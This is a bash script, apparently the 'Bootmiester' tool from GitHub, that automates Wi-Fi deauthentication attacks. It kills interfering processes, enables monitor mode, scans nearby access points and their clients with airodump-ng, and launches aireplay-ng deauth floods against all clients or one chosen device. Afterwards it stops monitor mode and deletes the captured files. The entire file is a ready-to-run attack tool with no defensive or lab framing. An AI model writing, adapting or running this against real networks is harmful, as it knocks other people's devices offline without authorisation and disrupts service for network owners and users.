#!/bin/bash

Black='\033[1;30m'        # Black
Red='\033[1;31m'          # Red
Green='\033[1;32m'        # Green
Yellow='\033[1;33m'       # Yellow
Blue='\033[1;34m'         # Blue
Purple='\033[1;35m'       # Purple
Cyan='\033[1;36m'         # Cyan
White='\033[1;37m'        # White
NC='\033[0m'
x=1;
lred='\033[0;31m'
white='\033[0;37m'
PROCESS="xterm"

root=$( id -u )
if [ $root  != 0 ] ; then
    echo -e "${Purple}[#] Run this Script as 'sudo'! "
    sleep 2
    exit
fi

clear
echo -e "\tBOOTMIESTER\n\tBy: Yashvendra Kashyap\n\thttps://github.com/Yashvendra/Bootmiester" | boxes -d cat -a c | lolcat
sleep 0.5
echo
#echo -e "\n${white}+-------------------------------------------------------------+"
#echo -e "+                The ${Green}BOOTMIESTER${white} welcomes you                 +"
#echo -e "${white}+-------------------------------------------------------------+${NC}" 
echo -ne "${Cyan}[#] Do you want to \e[0;37m(${Cyan}p\e[0;37m)${Cyan}roceed with the script or \e[0;37m(${Cyan}q\e[0;37m)${Cyan}quit \e[0;37m(${Cyan}p/q\e[0;37m)${Cyan}: \e[0;37m"
read op
if [[ "$op" = "p" ]]
then

	echo -ne "${Blue}[#] Enter your wireless interface name: ${White}"
	read interface

	mkdir ~/Desktop/MACS
	echo -e "${Green}[*] Starting Monitor Mode on "${interface}" ${NC}"
	sleep 2
	airmon-ng check kill &>/dev/null && airmon-ng start ${interface} &>/dev/null
	airodump-ng ${interface}mon -w ~/Desktop/wifi

	clear

	awk -F, '{OFS=",";print $1}' ~/Desktop/wifi-01.kismet.csv | awk -F';' '{print $4}' | sed '1d' > ~/Desktop/MACS/wifi.txt
	awk -F, '{OFS=",";print $1}' ~/Desktop/wifi-01.kismet.csv | awk -F';' '{print $6}' | sed '1d' > ~/Desktop/MACS/channels.txt

	echo -e "${Green}[*] WIFI's around you are: ${NC}"

	cat ~/Desktop/MACS/wifi.txt | while read p
	do 
		echo "$x: $p"
		x=$(( $x + 1 ))
	done

	echo -ne  "${Blue}[#] CHOOSE a WIFI: ${White}"
	read choice

	bssid=`sed "$choice!d" ~/Desktop/MACS/wifi.txt`
	channel=`sed "$choice!d" ~/Desktop/MACS/channels.txt`

	airodump-ng --bssid $bssid --channel $channel ${interface}mon -w ~/Desktop/devices
	sed '1,5d' ~/Desktop/devices-01.csv | awk -F "\"*,\"*" '{print $1}' | sed '$d' > ~/Desktop/MACS/devices.txt 

	x=2
	while [ $x -gt 1 ]
	do

		x=1
		clear
        	echo -e "${Blue}+-------------------------------------------------------+"
       	        echo -e "+\t${Green}Devices to be booted from ${Yellow}[${Purple}$bssid${Yellow}]   ${Blue}+"
        	echo -e "${Blue}+-------------------------------------------------------+${NC}"
        	sleep 1
		echo -e "${Blue}+                                                       +${NC}"
		cat ~/Desktop/MACS/devices.txt | while read p
		do
			echo -e "${Blue}+ ${White}$x.${Purple} $p                                  ${Blue}+"
			x=$(( $x + 1 ))
		done
		echo -e "${Blue}+-------------------------------------------------------+${NC}\n"
		sleep 1
		echo -e "${Green}[*] Press 1 if you want to boot the above devices.\n[*] Press 2 if you want to prevent a device to be booted.\n[*] Press 3 If you want to boot a particular device.${NC}"
		echo
		echo -ne "${Blue}[#] Enter your Choice: ${White}"
		read ch

		if [ $ch -eq 2 ] 
		then 
			sleep 1
			echo -ne "${Blue}[#] Enter the Device's Address which should not be booted: ${White}"
			read mac
			sed -i "/$mac/d" ~/Desktop/MACS/devices.txt 
			sleep 1
			x=2
		elif [ $ch -eq 1 ] 
		then
			echo -ne "${Blue}[#] Enter number of deauth packets to send: ${White}"
			read packets
			clear
			sleep 1
			a=100
			echo -e "${Red}[*] BOOTING the devices${Yellow} NOW"
			sleep 1
			cat ~/Desktop/MACS/devices.txt | while read q
			do
				xterm +hold -geometry 91x31+"$a"+500 -e "aireplay-ng --deauth ${packets} -a $bssid -c $q ${interface}mon" & 	
				a=$(( $a + 100 ))
			done
			x=1

			while true
			do
				if pgrep -x "$PROCESS" >/dev/null
				then 
					echo -n -e "${NC}."
					sleep 2
					continue
				else
					echo ""
					echo -e "${Green}[*] Stopping Monitor mode on the interface...${NC}"
					xterm +hold -geometry 91x31+700+500 -e "airmon-ng stop ${interface}mon && service network-manager restart"
					sleep 2
					echo -e "${Green}[*] Deleting the captured files..."
					sleep 2
					rm -rf ~/Desktop/devices-*
					rm -rf ~/Desktop/wifi-*
					rm -rf ~/Desktop/MACS
					echo -e "${Green}[*] DONE."
					break
				fi
			done
		elif [ $ch -eq 3 ]
		then
                        sleep 1
	                echo -ne "${Blue}[#] Enter the Device's Address which should be booted: ${White}"
                        read mac
			echo -ne "${Blue}[#] Enter number of deauth packets to send: ${White}"
			read packets
			sleep 1
			clear
			echo -e "${Red}[*] BOOTING ${White}$mac ${Yellow}NOW"
			sleep 1
			xterm +hold -geometry 91x31+700+500 -e "aireplay-ng --deauth $packets -a $bssid -c $mac ${interface}mon" &
			x=1
		        while true
                        do
                                if pgrep -x "$PROCESS" >/dev/null
                                then
                                        echo -n -e "${NC}."
                                        sleep 2
                                        continue
                                else
                                        echo ""
                                        echo -e "${Green}[*] Stopping Monitor mode on the interface...${NC}"
                                        xterm +hold -geometry 91x31+700+500 -e "airmon-ng stop ${interface}mon && service network-manager restart"
                                        sleep 2
                                        echo -e "${Green}[*] Deleting the captured files..."
                                        sleep 2
                                        rm -rf ~/Desktop/devices-*
                                        rm -rf ~/Desktop/wifi-*
                                        rm -rf ~/Desktop/MACS
                                        echo -e "${Green}[*] DONE."
                                        break
                                fi
                        done

		fi
	done

elif [[ "$op" = "q" ]]
then
	echo -e "[*] Byee! See you soon"
	sleep 1
	exit

else
	clear
	echo -e "[*] Wrong choice."
	sleep 1
	bootmiester
fi
